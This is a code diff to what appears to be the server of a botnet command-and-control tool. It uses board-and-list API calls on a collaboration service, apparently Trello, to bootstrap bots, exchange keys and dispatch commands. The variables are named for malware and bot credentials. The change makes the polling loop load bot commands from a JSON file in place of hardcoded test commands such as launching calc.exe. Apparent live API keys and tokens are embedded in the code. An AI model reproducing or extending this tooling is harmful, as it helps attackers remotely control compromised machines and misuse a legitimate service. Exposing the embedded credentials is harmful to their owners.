@@ -9,15 +9,14 @@ BOOTSTRAP_KEY = '1e3b5351487a6af8314ecf2547fb7ce5'
 BOOTSTRAP_TOKEN = 'ATTA7f6aa6cfecd14a8a7e81d990d37a15ea9dc35a8838d58e9b6b26f17fc1e8a96460BB1D97'
 NEW_CREDS_FILE = "new_creds.json"
 USED_CREDS_FILE = "used_creds.json"
+COMMANDS_FILE = "commands.json"
 available_bots_credential = []
 used_bots_credentials = []
 
 malware_ids_used = []
 executing_command_ids_per_bot = {}
 finished_command_ids_per_bot = {}
-commands = {'1': "print hello1",
-            '2': "run C:\\Windows\\System32\\calc.exe",
-            '3': "print hello2"}
+commands = {}
 
 
 def initialize_new_bot(bot_bootstrap_list_id, bot_id):
@@ -43,7 +42,8 @@ def initialize_new_bot(bot_bootstrap_list_id, bot_id):
 
     # create a list on the server bootstrap board
     list_name = utils.BOOTSTRAP_LIST_NAME_PREFIX + bot_id
-    server_bootstrap_list_id = utils.create_list_and_get_id(BOOTSTRAP_KEY, BOOTSTRAP_TOKEN, list_name, utils.SERVER_BOOTSTRAP_BOARD_ID)
+    server_bootstrap_list_id = utils.create_list_and_get_id(
+        BOOTSTRAP_KEY, BOOTSTRAP_TOKEN, list_name, utils.SERVER_BOOTSTRAP_BOARD_ID)
     # In each credentials exchange, the server generates a new private key and a new public key.
     key = utils.exchange_keys(
         BOOTSTRAP_KEY, BOOTSTRAP_TOKEN, server_bootstrap_list_id, bot_bootstrap_list_id)
@@ -179,9 +179,15 @@ def update_creds():
         available_bots_credentials, used_bots_credentials)
 
 
+def update_commands():
+    global commands
+    commands = json.loads(open(COMMANDS_FILE).read())["commands"]
+
+
 def main():
     while True:
         update_creds()
+        update_commands()
         check_bootstrap_board()
         check_bots_boards()
         time.sleep(10)
